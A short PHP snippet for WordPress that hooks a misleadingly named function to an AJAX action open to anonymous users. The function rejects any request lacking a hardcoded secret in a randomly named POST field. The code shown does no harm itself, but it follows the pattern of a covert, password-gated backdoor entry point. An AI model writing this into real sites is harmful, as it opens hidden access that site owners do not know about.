<?php

function security_blogroll_lightbox_shortcode() {
	if (!isset($_POST["drhczeswz"]) || $_POST["drhczeswz"] !== "nQrNahau2QWe") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'security_blogroll_lightbox_shortcode', 5, 1);
